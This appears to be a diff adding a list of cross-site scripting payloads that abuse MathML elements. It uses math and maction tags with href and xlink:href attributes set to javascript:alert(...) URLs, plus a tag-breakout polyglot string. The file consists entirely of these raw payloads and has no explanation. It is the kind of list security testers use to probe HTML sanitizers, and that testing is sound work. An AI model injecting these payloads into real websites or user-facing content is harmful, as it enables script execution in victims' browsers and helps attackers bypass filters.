@@ -1,0 +1,10 @@
+<math><a xlink:href="//jsfiddle.net/t846h/">click
+<math><brute href=javascript:alert(1)>click 
+<math><brute href=javascript:alert(201)>click
+<math><brute xlink:href=javascript:alert(1)>click 
+<math><brute xlink:href=javascript:alert(218)>click
+</math>//["'`-->]]>]</div>
+<math href="javascript:alert(1)">CLICKME
+<math href="javascript:javascript:alert(1486)">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1486)">CLICKME</maction> </math>
+<math href="javascript:javascript:alert(1)">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>
+<math href="javascript:javascript:alert(572)">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(572)">CLICKME</maction> </math>
